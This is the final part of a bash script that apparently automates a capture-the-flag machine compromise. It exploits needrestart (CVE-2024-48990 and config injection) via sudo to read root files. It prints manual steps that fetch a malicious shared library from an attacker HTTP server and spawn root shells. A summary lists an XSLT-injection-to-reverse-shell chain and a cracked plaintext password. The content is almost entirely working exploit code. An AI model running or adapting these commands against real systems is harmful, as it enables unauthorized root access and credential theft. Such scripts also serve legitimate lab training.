        flag_found "ROOT FLAG" "$ROOT_FLAG"
        echo "$ROOT_FLAG" > "$WORKDIR/loot/root.txt"
    else
        warn "Root flag not auto-extracted see: $WORKDIR/loot/privesc_output.txt"
        if echo "$EXPLOIT_OUT" | grep -qi "ROOT_DONE\|root flag\|pwn_ready"; then
            info "Exploit may have succeeded check victim for /tmp/root_flag.txt"
        fi
        privesc_manual_guide
    fi

    # ── Fast-path Variant A: Perl BEGIN config injection ──
    if [[ -z "$ROOT_FLAG" ]]; then
        step "Fast-path: needrestart Perl BEGIN config injection"
        sshpass -p "$FISMA_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=12 \
            "${FISMA_USER}@${TARGET}" \
            'printf "BEGIN { system(\"cat /root/root.txt\") }\n[needrestart]\n" > /tmp/exploit.conf && \
            sudo /usr/sbin/needrestart -c /tmp/exploit.conf 2>/dev/null; \
            rm -f /tmp/exploit.conf' \
            2>/dev/null > "$WORKDIR/loot/nr_out_a.txt" || true
        ROOT_FLAG=$(grep -oP "[0-9a-f]{32}" "$WORKDIR/loot/nr_out_a.txt" | head -1 || echo "")
        if [[ -n "$ROOT_FLAG" ]]; then
            flag_found "ROOT FLAG (Perl BEGIN)" "$ROOT_FLAG"
            echo "$ROOT_FLAG" > "$WORKDIR/loot/root.txt"
        fi
    fi

    # ── Variant B: exec config method ──
    if [[ -z "$ROOT_FLAG" ]]; then
        step "Variant B: exec config method"
        sshpass -p "$FISMA_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=12 \
            "${FISMA_USER}@${TARGET}" \
            'printf "exec \"/bin/cat\",\"/root/root.txt\";\n" > /tmp/con.conf && \
            sudo /usr/sbin/needrestart -c /tmp/con.conf 2>/dev/null; \
            rm -f /tmp/con.conf' \
            2>/dev/null > "$WORKDIR/loot/nr_out_b.txt" || true
        ROOT_FLAG=$(grep -oP "[0-9a-f]{32}" "$WORKDIR/loot/nr_out_b.txt" | head -1 || echo "")
        if [[ -n "$ROOT_FLAG" ]]; then
            flag_found "ROOT FLAG (exec config)" "$ROOT_FLAG"
            echo "$ROOT_FLAG" > "$WORKDIR/loot/root.txt"
        fi
    fi

    # ── Final: SUID /tmp/pwn or /tmp/root_flag.txt from runner ──
    if [[ -z "$ROOT_FLAG" ]]; then
        step "Final: checking SUID /tmp/pwn and /tmp/root_flag.txt"
        sshpass -p "$FISMA_PASS" ssh -o StrictHostKeyChecking=no "${FISMA_USER}@${TARGET}" \
            "cat /tmp/root_flag.txt 2>/dev/null || /tmp/pwn -p -c 'cat /root/root.txt' 2>/dev/null" \
            2>/dev/null > "$WORKDIR/loot/pwn_out.txt" || true
        ROOT_FLAG=$(grep -oP "[0-9a-f]{32}" "$WORKDIR/loot/pwn_out.txt" | head -1 || echo "")
        if [[ -n "$ROOT_FLAG" ]]; then
            flag_found "ROOT FLAG (SUID /tmp/pwn)" "$ROOT_FLAG"
            echo "$ROOT_FLAG" > "$WORKDIR/loot/root.txt"
        fi
    fi
}

privesc_manual_guide() {
    echo ""
    echo -e "${BLUE}${BOLD}━━ MANUAL PRIVESC STEPS (if automation failed) ━━${NC}"
    echo ""
    echo -e "${CYAN}# On ATTACKER start HTTP server:${NC}"
    echo -e "  cd $WORKDIR/serve && python3 -m http.server $HTTP_PORT"
    echo ""
    echo -e "${CYAN}# On VICTIM (SSH as fismathack) CVE-2024-48990:${NC}"
    echo -e "  mkdir -p /tmp/.m/importlib"
    echo -e "  curl http://$LHOST:$HTTP_PORT/__init__.so -o /tmp/.m/importlib/__init__.so"
    echo -e "  PYTHONPATH=/tmp/.m python3 -c 'import time; time.sleep(60)' &"
    echo -e "  sudo /usr/sbin/needrestart    # triggers hijack"
    echo -e "  /tmp/pwn -p                   # SUID root shell"
    echo -e "  cat /root/root.txt"
    echo ""
    echo -e "${CYAN}# Alternate (simpler) needrestart config injection:${NC}"
    echo -e "  echo '\$nrconf{ui} = \"NeedRestart::UI::stdio\"; system(\"/bin/bash\");' \\"
    echo -e "    > /tmp/nr.conf"
    echo -e "  sudo /usr/sbin/needrestart -c /tmp/nr.conf"
    echo ""
    echo -e "${CYAN}# One-liner Perl BEGIN exploit:${NC}"
    echo -e "  echo 'BEGIN { system(\"/bin/bash\") }' > /tmp/x.conf"
    echo -e "  sudo /usr/sbin/needrestart -c /tmp/x.conf"
    echo ""
    echo -e "${CYAN}# Direct flag read (if any method gives root shell):${NC}"
    echo -e "  cat /root/root.txt"
    echo ""
}

# ════════════════════════ TROPHY ROOM ════════════════════════
trophy_room() {
    local user_flag root_flag
    user_flag=$(cat "$WORKDIR/loot/user.txt" 2>/dev/null | tr -d '\n' || echo "Not captured")
    root_flag=$(cat "$WORKDIR/loot/root.txt" 2>/dev/null | tr -d '\n' || echo "Not captured")

    echo ""
    echo -e "${GREEN}${BOLD}"
    cat << 'TROPHY'
  ╔══════════════════════════════════════════════════════════════╗
  ║                    🏆  TROPHY ROOM  🏆                       ║
  ╠══════════════════════════════════════════════════════════════╣
TROPHY
    echo -e "  ║  ${NC}${MAGENTA}${BOLD}USER${NC}${GREEN}${BOLD} → ${NC}${WHITE}${user_flag}${GREEN}${BOLD}  ║"
    echo -e "  ║  ${NC}${RED}${BOLD}ROOT${NC}${GREEN}${BOLD} → ${NC}${WHITE}${root_flag}${GREEN}${BOLD}  ║"
    echo -e "${GREEN}${BOLD}  ╠══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}${BOLD}  ║  Full Attack Chain:${NC}                                         ${GREEN}${BOLD}║${NC}"
    echo -e "${GREEN}${BOLD}  ╠══════════════════════════════════════════════════════════════╣${NC}"
    cat << 'CHAIN'
  ║  [1] Nmap            → 22/SSH + 80/HTTP (Apache 2.4.52)     ║
  ║  [2] Web app         → Flask + lxml XSLT converter          ║
  ║  [3] Register/Login  → Get session cookie                    ║
  ║  [4] XSLT Injection  → ptswarm:document EXSLT file write    ║
  ║                       → /scripts/shell.py → webroot         ║
  ║  [5] Cron job        → * * * * * python3 /scripts/*.py      ║
  ║                       → www-data reverse shell              ║
  ║  [6] users.db        → fismathack:5b5c3ac3... (MD5)         ║
  ║  [7] Hash crack      → Keepmesafeandwarm                    ║
  ║  [8] SSH             → fismathack → user.txt                ║
  ║  [9] sudo -l         → NOPASSWD /usr/sbin/needrestart       ║
  ║  [10] CVE-2024-48990 → needrestart 3.7 PYTHONPATH hijack    ║
  ║                       → SUID /tmp/pwn → root.txt            ║
  ╚══════════════════════════════════════════════════════════════╝
CHAIN
    echo ""
    echo -e "  ${DIM}Credentials:${NC}"
    echo -e "  ${DIM}  fismathack : $FISMA_PASS${NC}"
    echo -e "  ${DIM}  FISMA MD5  : $FISMA_HASH${NC}"
    echo ""
    echo -e "  ${DIM}Artifacts saved to: $WORKDIR/loot/${NC}"
    echo ""
    echo -e "${BLUE}${BOLD}  Manual SSH access:${NC}"
    echo -e "  ${CYAN}ssh fismathack@$TARGET  (pw: $FISMA_PASS)${NC}"
    echo ""
}

# ════════════════════════ MAIN ════════════════════════
main() {
    banner
    check_deps
    phase_recon
    phase_auth
    phase_payloads
    phase_shell_handler      # Start listener BEFORE triggering upload
    phase_upload             # Upload XSLT, wait for cron
    phase_crack              # Crack hash extracted by shell handler
    phase_ssh_user           # SSH + user flag
    phase_privesc            # CVE-2024-48990 + root flag
    trophy_room
}

main "$@"
